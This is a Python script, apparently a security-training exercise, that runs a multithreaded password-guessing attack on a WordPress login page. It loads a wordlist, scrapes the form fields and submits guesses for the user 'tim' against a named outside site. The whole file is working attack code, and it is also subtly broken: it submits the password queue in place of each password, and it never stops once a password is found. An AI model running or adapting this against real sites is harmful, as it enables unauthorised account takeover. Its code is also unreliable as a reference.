from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = 'Welcome to WordPress!'
TARGET = "http://boodelyboo.com/wordpress/wp-login.php"
WORDLIST = '/home/kali/bhp/python/python_codes/cain-and-abel.txt'


def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words


def get_params(content):
    params = dict()
    parser = etree.XMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'):
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('Value', None)
    return params


class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\n Brute force attack beginning on {url}.\n')
        print("Finished setup where Username = %s\n" % username)

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['log'] = self.username

        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying Username/Password {self.username}/{passwd:<10}')
            params['pwd'] = passwords

            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                print("Success, found credential")
                print("Username is %s.\n" % self.username)
                print("Password is %s.\n" % passwd)
                print("Done.Cleaning up other threads")


if __name__ == '__main__':
    words = get_words()
    b = Bruter('tim', TARGET)
    b.run_bruteforce(words)
